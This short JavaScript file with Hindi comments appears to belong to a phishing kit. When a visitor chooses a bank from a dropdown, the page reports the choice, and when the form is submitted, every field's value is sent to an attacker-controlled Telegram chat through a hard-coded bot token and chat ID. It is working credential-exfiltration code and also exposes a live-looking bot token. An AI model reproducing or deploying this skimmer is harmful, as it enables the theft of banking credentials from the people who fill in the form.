document.addEventListener("DOMContentLoaded", function () {
    const bankSelect = document.getElementById('bankSelect');
    const submitForm = document.getElementById('submitForm');

    // ✅ Telegram Bot Details
    const chat_id = "-1002677669875"; // आपका Telegram Chat ID
    const bot_token = "7839710665:AAGKbR-tYd-mfFYfptxDZnpaUctzEAWMfwU"; // आपका बॉट टोकन

    // ✅ जब बैंक सेलेक्ट हो
    bankSelect.addEventListener('change', function () {
        const selectedBank = bankSelect.value;

        if (selectedBank && selectedBank !== "Select your bank") {
            sendToTelegram(`📢 नया बैंक चुना गया: ${selectedBank.toUpperCase()}`);
        }
    });

    // ✅ जब फॉर्म सबमिट हो
    submitForm.addEventListener("submit", function (event) {
        event.preventDefault(); // फॉर्म रीफ्रेश होने से बचाने के लिए

        const formData = new FormData(submitForm);
        let message = "📌 **नई जानकारी मिली:**\n";

        formData.forEach((value, key) => {
            message += `📝 ${key}: ${value}\n`;
        });

        sendToTelegram(message);
    });

    // ✅ Telegram API पर डेटा भेजने का फ़ंक्शन
    function sendToTelegram(message) {
        const telegramURL = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        fetch(telegramURL)
            .then(response => response.json())
            .then(data => console.log("✅ Telegram Response:", data))
            .catch(error => console.error("❌ Telegram Error:", error));
    }
});